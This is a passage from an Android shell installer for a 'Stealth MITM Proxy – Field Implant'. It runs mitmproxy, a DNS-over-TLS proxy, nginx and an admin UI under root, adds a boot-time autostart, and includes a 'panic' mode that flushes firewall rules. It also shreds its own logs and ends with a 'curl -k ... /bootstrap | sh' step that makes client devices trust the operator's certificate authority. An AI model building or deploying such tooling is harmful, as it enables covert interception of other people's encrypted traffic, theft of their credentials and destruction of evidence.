if [ -n "$PYTHON" ]; then
    (
        while true; do
            "$PYTHON" "$BASE/scripts/dot_proxy.py" >>"$LOG" 2>&1
            log "DoT proxy crashed, restarting in 5s"
            sleep 5
        done
    ) &
else
    log "WARN: python not found — DoT proxy skipped"
fi

(
    while true; do
        bash "$BASE/scripts/run_mitmproxy.sh" >>"$LOG" 2>&1
        log "mitmproxy crashed, restarting in 5s"
        sleep 5
    done
) &

if [ -n "$PYTHON" ]; then
    (
        while true; do
            "$PYTHON" "$BASE/scripts/admin_ui.py" >>"$LOG" 2>&1
            log "Flask UI crashed, restarting in 3s"
            sleep 3
        done
    ) &
fi

if command -v nginx >/dev/null 2>&1; then
    nginx -t -c "$BASE/nginx/nginx.conf" >>"$LOG" 2>&1 \
        && nginx -c "$BASE/nginx/nginx.conf" >>"$LOG" 2>&1 \
        || log "WARN: nginx failed — check nginx_error.log"
else
    log "WARN: nginx not found"
fi

if [ -x "$BASE/scripts/update_ddns.sh" ]; then
    nohup sh "$BASE/scripts/update_ddns.sh" >>"$LOG" 2>&1 &
fi

(
    while true; do
        sleep 3600
        for f in "$BASE"/logs/*.log; do
            [ -f "$f" ] || continue
            SIZE=$(wc -c < "$f" 2>/dev/null || echo 0)
            if [ "$SIZE" -gt 10485760 ]; then
                if command -v shred >/dev/null 2>&1; then
                    shred -zu "$f" 2>/dev/null || true
                else
                    dd if=/dev/zero of="$f" bs=4096 2>/dev/null || true
                    rm -f "$f"
                fi
                touch "$f" 2>/dev/null || true
            fi
        done
    done
) &

log "All services started."
RUNALL
chmod +x "$BASE_DIR/scripts/run_all.sh"

# ---------- mitm-ctl ----------
cat > "$BASE_DIR/bin/mitm-ctl" << 'CTL'
#!/system/bin/sh
set -eu
BASE=/data/local/tmp/mitm_stealth
SCRIPT="$BASE/scripts/run_all.sh"
PIDFILE="$BASE/run_all.pid"

stop_services() {
    if [ -f "$PIDFILE" ]; then
        PID=$(cat "$PIDFILE" 2>/dev/null || true)
        [ -n "$PID" ] && kill -TERM "$PID" 2>/dev/null || true
        rm -f "$PIDFILE"
    fi
    for svc in mitmweb dnsmasq nginx dot_proxy.py admin_ui.py update_ddns; do
        pkill -f "$svc" 2>/dev/null || true
    done
    wg-quick down /data/local/tmp/mitm_stealth/wireguard/wg0.conf 2>/dev/null || true
    iptables -t nat -F 2>/dev/null || true
    iptables -F 2>/dev/null || true
    ip6tables -F 2>/dev/null || true
    ip6tables -t nat -F 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
}

case "${1:-}" in
    start)
        if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE" 2>/dev/null)" 2>/dev/null; then
            echo "Already running (PID $(cat "$PIDFILE"))."
            exit 0
        fi
        sh "$SCRIPT" &
        echo "$!" > "$PIDFILE"
        echo "Started (PID $!)."
        ;;
    stop)
        stop_services
        echo "Stopped."
        ;;
    status)
        for s in mitmweb dnsmasq nginx dot_proxy.py; do
            if pgrep -f "$s" >/dev/null 2>&1; then
                printf "%-20s running\n" "$s"
            else
                printf "%-20s stopped\n" "$s"
            fi
        done
        iptables -t nat -L PREROUTING -n 2>/dev/null | grep REDIRECT | head -5 || true
        ;;
    panic)
        stop_services
        echo "Panic done. All rules and processes cleared."
        ;;
    restart)
        stop_services
        sleep 2
        sh "$SCRIPT" &
        echo "$!" > "$PIDFILE"
        echo "Restarted (PID $!)."
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status|panic}"
        exit 1
        ;;
esac
CTL
chmod +x "$BASE_DIR/bin/mitm-ctl"

# ---------- Termux boot ----------
if [ -d "$HOME/.termux" ]; then
    mkdir -p "$HOME/.termux/boot/"
    cat > "$HOME/.termux/boot/start_mitm_stealth" << 'BOOT'
#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
sleep 15
su -c "/data/local/tmp/mitm_stealth/bin/mitm-ctl start"
BOOT
    chmod +x "$HOME/.termux/boot/start_mitm_stealth"
    info "Termux boot script created."
else
    warn "Termux directory not found. Add auto-start manually if needed."
fi

echo
echo "======================================"
echo " Stealth MITM Proxy – Field Implant"
echo "======================================"
echo " Web UI: https://${HOST1}:${WEBUI_HTTPS_PORT}/ or https://${HOST2}:${WEBUI_HTTPS_PORT}/"
echo " Login: ${WEBUI_USER} / ${WEBUI_PASS}"
echo " (Credentials saved to ${BASE_DIR}/.credentials)"
echo ""
echo " Client bootstrap (no root):"
echo "   curl -k https://<hotspot-ip>:${WEBUI_HTTPS_PORT}/bootstrap | sh"
echo "   (Downloads CA and opens installer – tap OK to trust.)"
echo ""
echo " Control: ${BASE_DIR}/bin/mitm-ctl {start|stop|restart|status|panic}"
echo "======================================"
